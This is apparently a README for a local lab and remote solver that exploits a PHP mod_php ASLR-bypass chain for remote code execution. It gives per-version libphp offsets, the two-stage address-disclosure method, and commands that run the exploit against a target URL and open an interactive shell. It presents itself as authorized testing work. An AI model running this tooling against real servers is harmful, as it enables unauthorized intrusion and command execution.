# PHP2Shell ASLR Laboratory

An authorized, local-only laboratory and version-aware solver for the PHP
Apache `mod_php` ASLR exploitation chain associated with:

```text
CVE-2026-109618
CVE-2026-109619
```

The project contains:

- a vulnerable PHP 8.4.26 Apache `mod_php` challenge;
- a PHP 8.4.27 patched control;
- a remote, fixed-proof ASLR solver;
- a token-protected HTTP shell;
- exact request/response dumping;
- per-build profile dispatch;
- organizer-only calibration and matrix tooling;
- unit tests and CI.

The exploit core is not redistributed. The solver clones the public research
primitive at runtime and pins this commit:

```text
4586f5cc120c82fd468b17469202bac629810ad9
```

## Status

Only profiles with both `verified: true` and `rce: true` are enabled by the
remote runner.

| PHP | Architecture | `zif_system` | `zval_ptr_dtor` | Stage 1 | RCE |
|---:|---|---:|---:|---:|---|
| 8.4.25 | aarch64 | `0x42fa30` | `0x637ae0` | 841/63 | ✅ |
| 8.4.26 | amd64 | `0x465370` | `0x65eb60` | 841/79 | ✅ |
| 8.5.10 | aarch64 | `0x52e130` | `0x75d360` | 841/63 | ✅ |
| 8.5.11 | aarch64 | `0x5314f0` | `0x761b80` | 841/63 | ✅ |
| 8.5.11 | amd64 | `0x5996e0` | `0x7b47a0` | 841/63 | ✅ |

Additional calibration evidence:

| PHP | Result | Enabled |
|---:|---|---|
| 8.0.30 amd64 | stage-1 disclosure failed | no |
| 8.1.34 amd64 | stage-1 disclosure failed | no |
| 8.2.34 amd64 | stage-1 disclosure failed | no |
| 8.3.35 amd64/aarch64 | heap and libphp leaks; stage 3 unverified | no |
| 8.5.0 aarch64 | heap and libphp leaks; stage 3 unverified | no |

The complete generated table is in
[`solver/profiles/INVENTORY.md`](solver/profiles/INVENTORY.md).

## Quick start

Start the vulnerable and patched local services:

```sh
make up
make check
```

Default endpoints:

```text
vulnerable: http://127.0.0.1:8426
patched:    http://127.0.0.1:8427
```

Run the organizer-only fixed proof:

```sh
make solve
```

Run the remote player solver:

```sh
./solver/solve_remote.py http://127.0.0.1:8426
```

If PHP's version header is hidden:

```sh
./solver/solve_remote.py http://target:8426 --version 8.4.26
```

If one PHP version has profiles for multiple architectures:

```sh
./solver/solve_remote.py http://target:8426 \
  --version 8.5.11 \
  --arch amd64
```

## Interactive shell

```sh
./solver/solve_remote.py http://127.0.0.1:8426 --shell
```

Optional pwntools frontend:

```sh
python3 -m pip install pwntools
./solver/solve_remote.py http://127.0.0.1:8426 \
  --shell --pwn-interactive
```

The shell:

- is created only after exploitation;
- uses a random 128-bit token;
- communicates over the existing HTTP service;
- supports stdout, stderr, exit codes and `cd` tracking;
- exits on `exit` or Ctrl-D.

## Real request display and dumps

Show every real exploit exchange on screen:

```sh
./solver/solve_remote.py http://127.0.0.1:8426 --show-requests
```

Show and archive exact request/response bytes:

```sh
./solver/solve_remote.py http://127.0.0.1:8426 \
  --dump-requests runtime/request-dumps
```

Each dump contains gzip-compressed byte-for-byte request and response streams,
JSON metadata and SHA-256 hashes. See
[docs/request-dumps.md](docs/request-dumps.md).

## ASLR derivation

The exploit does not disable ASLR. Both randomized bases are disclosed at run
time:

```text
zend_chunk_base = stage-1 Set-Cookie disclosure
libphp_base     = stage-2 zval_ptr_dtor disclosure
```

The profile then derives:

```text
HTDATA     = zend_chunk_base + profile_htdata_offset
zif_system = libphp_base     + profile_zif_system_offset
```

The solver aborts unless both disclosures succeed and the fixed proof is
received.

## Calibration and research tooling

Calibrate a local image:

```sh
./research/calibrate_image.py \
  --image php:8.5.11-apache \
  --platform linux/amd64
```

Inspect profile inventory:

```sh
make inventory
make validate-profiles
```

Run named matrices:

```sh
make matrix-list
make matrix MATRIX=verified
make matrix-refresh MATRIX=verified
make matrix-full
```

Extract ELF offsets without exploitation:

```sh
make extract-offsets \
  IMAGE=php:8.4.26-apache \
  PLATFORM=linux/amd64
```

Full documentation:

- [Architecture](docs/architecture.md)
- [Solution notes](docs/solution.md)
- [Research tooling](docs/research-tooling.md)
- [Request dumps](docs/request-dumps.md)
- [Runtime upstream changes](docs/upstream-changes.md)
- [Credits and attribution](ACKNOWLEDGEMENTS.md)

## Project layout

```text
challenge/       Lab, Compose files, challenge manifest and PHP platform
solver/          Remote/local solvers, runtime bootstrap and profiles
research/        Calibration factory, matrices, inventory and offset tooling
docs/            Architecture, solution and operational documentation
scripts/         Local lab lifecycle and proof verification
tests/           Unit tests
runtime/         Generated proofs, reports, logs and request archives
```

## Fixed PHP releases

The official advisory identifies these fixed releases:

```text
PHP 8.2.35
PHP 8.3.36
PHP 8.4.27
PHP 8.5.12
```

The calibrator refuses to profile a fixed release.

## Safety

- Use this repository only against systems you own or are explicitly authorized
  to test.
- Keep public bindings behind a VPN, firewall or private challenge network.
- Do not expose the organizer Docker socket to players.
- Do not point the exploit at third-party infrastructure.
- The producer requests are large and intentionally disruptive.
- Request dumps may contain flags or one-time shell tokens.

## Tests

```sh
python3 -m py_compile solver/*.py research/*.py
python3 -m unittest discover -s tests -v
./research/profile_inventory.py --check
./research/matrix_runner.py --set full --dry-run
```

## Credits and license

The original public exploit primitive is by **9bie and contributors** and is
fetched at runtime from `9bie/php2shell-bypass-aslr-exp`; it is not vendored or
redistributed here. Vulnerability reporters and PHP remediation developers are
listed in [`ACKNOWLEDGEMENTS.md`](ACKNOWLEDGEMENTS.md).

Original material in this repository is under the MIT license. The runtime
fetched upstream exploit remains governed by its repository terms and is not
vendored or redistributed here.
